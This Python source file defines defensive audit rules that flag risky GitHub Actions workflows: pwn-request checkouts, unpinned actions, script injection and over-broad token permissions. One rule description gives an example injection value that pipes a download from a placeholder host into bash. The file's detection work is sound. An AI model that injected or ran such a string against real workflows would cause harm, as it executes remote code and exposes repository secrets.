"""Rules that analyze GitHub Actions workflow files (GHA001–GHA008)."""

from __future__ import annotations

from collections.abc import Iterator

from github_auditor.analyze.rules.base import RepoContext, Rule
from github_auditor.analyze.workflow_parser import (
    ParsedJob,
    ParsedWorkflow,
    find_untrusted_expressions,
    is_local_or_trusted,
    is_sha_pinned,
    is_write_permissions,
    split_uses,
)
from github_auditor.models import Finding, Severity

DANGEROUS_TRIGGERS = ("pull_request_target", "workflow_run", "issue_comment")

PR_HEAD_REF_MARKERS = (
    "github.event.pull_request.head.sha",
    "github.event.pull_request.head.ref",
    "github.head_ref",
    "github.event.pull_request.merge_commit_sha",
    "github.event.issue.number",  # checkout of PR by number in issue_comment handlers
)


def _loc(wf: ParsedWorkflow, job: ParsedJob | None = None, step_label: str | None = None) -> str:
    parts = [wf.path]
    if job is not None:
        parts.append(f"job:{job.id}")
    if step_label is not None:
        parts.append(step_label)
    return " § ".join(parts)


class PwnRequestRule(Rule):
    id = "GHA001"
    name = "pwn-request"
    default_severity = Severity.CRITICAL
    description = (
        "A workflow triggered by pull_request_target (or another privileged trigger) checks "
        "out the pull request head. The PR author's code then runs with access to repository "
        "secrets and a read/write GITHUB_TOKEN — the classic 'pwn request' pattern used to "
        "steal PATs and poison releases."
    )
    remediation = (
        "Do not check out untrusted PR code in a privileged workflow. Use the plain "
        "pull_request trigger, or split the workflow so untrusted code runs without secrets "
        "(e.g. via workflow_run with artifacts treated as untrusted input)."
    )

    def check(self, ctx: RepoContext) -> Iterator[Finding]:
        for wf in ctx.workflows:
            if not wf.has_trigger("pull_request_target", "issue_comment"):
                continue
            trigger = (
                "pull_request_target" if "pull_request_target" in wf.triggers else "issue_comment"
            )
            for job in wf.jobs:
                for step in job.steps:
                    if not (step.uses and step.uses.split("@")[0].endswith("actions/checkout")):
                        continue
                    ref = str(step.with_.get("ref", ""))
                    if any(marker in ref for marker in PR_HEAD_REF_MARKERS):
                        yield self.finding(
                            ctx,
                            title=f"{trigger} workflow checks out untrusted PR head",
                            location=_loc(wf, job, step.label),
                            evidence=f"uses: {step.uses} with ref: {ref}",
                        )


class UnpinnedActionRule(Rule):
    id = "GHA002"
    name = "unpinned-action"
    default_severity = Severity.MEDIUM
    description = (
        "A third-party action is referenced by a mutable tag or branch instead of a full "
        "commit SHA. If the action's repo or a maintainer account is compromised, the tag can "
        "be repointed at malicious code that immediately runs in your workflows (as happened "
        "with tj-actions/changed-files)."
    )
    remediation = (
        "Pin third-party actions to a full-length commit SHA "
        "(e.g. uses: some/action@<40-char sha> # vX.Y.Z) and update via Dependabot."
    )

    def check(self, ctx: RepoContext) -> Iterator[Finding]:
        trusted = ctx.settings.trusted_action_owners
        for wf in ctx.workflows:
            dangerous = any(t in wf.triggers for t in DANGEROUS_TRIGGERS)
            seen: set[str] = set()
            for job in wf.jobs:
                for step in job.steps:
                    uses = step.uses
                    if not uses or uses in seen:
                        continue
                    if uses.startswith("docker://"):
                        continue
                    if is_local_or_trusted(uses, ctx.org, trusted) or is_sha_pinned(uses):
                        continue
                    seen.add(uses)
                    _, ref = split_uses(uses)
                    yield self.finding(
                        ctx,
                        title=f"Third-party action not SHA-pinned: {uses}",
                        severity=Severity.HIGH if dangerous else Severity.MEDIUM,
                        location=_loc(wf, job, step.label),
                        evidence=f"uses: {uses} (ref '{ref or 'none'}' is mutable)",
                    )


class ExternalReusableWorkflowRule(Rule):
    id = "GHA003"
    name = "external-reusable-workflow"
    default_severity = Severity.HIGH
    description = (
        "A job calls a reusable workflow from another owner, or by a mutable ref. The called "
        "workflow runs with this repository's secrets and token; a compromise or repointed "
        "tag in that external repo compromises every caller."
    )
    remediation = (
        "Only call reusable workflows you control, and pin external ones to a full commit SHA."
    )

    def check(self, ctx: RepoContext) -> Iterator[Finding]:
        for wf in ctx.workflows:
            for job in wf.jobs:
                uses = job.uses
                if not uses or uses.startswith("./"):
                    continue
                owner = uses.split("/")[0].lower()
                external = owner != ctx.org.lower()
                pinned = is_sha_pinned(uses)
                if external or not pinned:
                    detail = []
                    if external:
                        detail.append(f"external owner '{owner}'")
                    if not pinned:
                        detail.append("not SHA-pinned")
                    yield self.finding(
                        ctx,
                        title=f"Reusable workflow risk: {uses}",
                        severity=Severity.HIGH if external else Severity.MEDIUM,
                        location=_loc(wf, job),
                        evidence=f"uses: {uses} ({', '.join(detail)})",
                    )


class WorkflowRunTriggerRule(Rule):
    id = "GHA004"
    name = "workflow-run-artifact"
    default_severity = Severity.HIGH
    description = (
        "A workflow_run-triggered workflow downloads artifacts or consumes data produced by "
        "the triggering (untrusted, fork-initiated) run while itself running with secrets. "
        "Malicious artifact content can escalate into secret theft."
    )
    remediation = (
        "Treat every artifact from a workflow_run trigger as untrusted input: validate it, "
        "never execute it, and minimize the consuming workflow's permissions."
    )

    def check(self, ctx: RepoContext) -> Iterator[Finding]:
        for wf in ctx.workflows:
            if "workflow_run" not in wf.triggers:
                continue
            for job in wf.jobs:
                for step in job.steps:
                    downloads = step.uses and "download-artifact" in step.uses
                    consumes = step.run and "github.event.workflow_run" in step.run
                    if downloads or consumes:
                        yield self.finding(
                            ctx,
                            title="workflow_run workflow consumes untrusted run output",
                            location=_loc(wf, job, step.label),
                            evidence=(step.uses or (step.run or "")[:200]),
                        )
                        break  # one finding per job is enough


class ScriptInjectionRule(Rule):
    id = "GHA005"
    name = "script-injection"
    default_severity = Severity.CRITICAL
    description = (
        "An attacker-controllable value (PR title/body, branch name, comment, commit message) "
        "is interpolated directly into a script. A crafted value like "
        '`"; curl evil.sh | bash #` executes arbitrary commands in the runner, exposing '
        "secrets and the GITHUB_TOKEN."
    )
    remediation = (
        "Pass untrusted context through an intermediate environment variable "
        '(env: TITLE: ${{ github.event.pull_request.title }}) and reference "$TITLE" in the '
        "script, or use actions/github-script with arguments."
    )

    def check(self, ctx: RepoContext) -> Iterator[Finding]:
        for wf in ctx.workflows:
            for job in wf.jobs:
                for step in job.steps:
                    scripts: list[str] = []
                    if step.run:
                        scripts.append(step.run)
                    if step.uses and "github-script" in step.uses:
                        script_input = step.with_.get("script")
                        if isinstance(script_input, str):
                            scripts.append(script_input)
                    for script in scripts:
                        for expr in find_untrusted_expressions(script):
                            yield self.finding(
                                ctx,
                                title="Untrusted input interpolated into script",
                                location=_loc(wf, job, step.label),
                                evidence="${{ " + expr + " }}",
                            )


class WritePermissionsRule(Rule):
    id = "GHA006"
    name = "broad-write-permissions"
    default_severity = Severity.MEDIUM
    description = (
        "The workflow grants write-level GITHUB_TOKEN permissions. Combined with a dangerous "
        "trigger, any code execution in the workflow can push commits, tamper with releases, "
        "or approve pull requests."
    )
    remediation = (
        "Set a top-level `permissions: contents: read` and grant write scopes per job only "
        "where needed."
    )

    def check(self, ctx: RepoContext) -> Iterator[Finding]:
        for wf in ctx.workflows:
            dangerous = any(t in wf.triggers for t in DANGEROUS_TRIGGERS)
            severity = Severity.HIGH if dangerous else Severity.MEDIUM
            if is_write_permissions(wf.permissions):
                yield self.finding(
                    ctx,
                    title="Workflow grants write-level token permissions",
                    severity=severity,
                    location=_loc(wf),
                    evidence=f"permissions: {wf.permissions}",
                )
                continue  # job-level grants are subsumed by a top-level write
            for job in wf.jobs:
                if is_write_permissions(job.permissions):
                    yield self.finding(
                        ctx,
                        title=f"Job '{job.id}' grants write-level token permissions",
                        severity=severity,
                        location=_loc(wf, job),
                        evidence=f"permissions: {job.permissions}",
                    )


class MissingPermissionsBlockRule(Rule):
    id = "GHA007"
    name = "missing-permissions-block"
    default_severity = Severity.LOW
    description = (
        "The workflow declares no `permissions:` block, so the GITHUB_TOKEN falls back to the "
        "repository/org default — which is often read-write on older repos."
    )
    remediation = "Add an explicit least-privilege `permissions:` block to every workflow."

    def check(self, ctx: RepoContext) -> Iterator[Finding]:
        for wf in ctx.workflows:
            if wf.permissions is not None:
                continue
            if wf.jobs and all(j.permissions is not None for j in wf.jobs):
                continue
            yield self.finding(
                ctx,
                title="Workflow has no permissions block",
                location=_loc(wf),
            )


class CallableReusableWorkflowPermsRule(Rule):
    id = "GHA008"
    name = "callable-workflow-permissions"
    default_severity = Severity.MEDIUM
    description = (
        "A reusable (workflow_call) workflow requests write permissions or declares none at "
        "all. Every caller inherits that exposure, multiplying the blast radius of a bug in "
        "this one file."
    )
    remediation = "Give reusable workflows an explicit, read-only permissions block."

    def check(self, ctx: RepoContext) -> Iterator[Finding]:
        for wf in ctx.workflows:
            if "workflow_call" not in wf.triggers:
                continue
            if is_write_permissions(wf.permissions) or any(
                is_write_permissions(j.permissions) for j in wf.jobs
            ):
                yield self.finding(
                    ctx,
                    title="Reusable workflow requests write permissions",
                    location=_loc(wf),
                    evidence=f"permissions: {wf.permissions}",
                )
            elif wf.permissions is None:
                yield self.finding(
                    ctx,
                    title="Reusable workflow has no permissions block",
                    severity=Severity.LOW,
                    location=_loc(wf),
                )
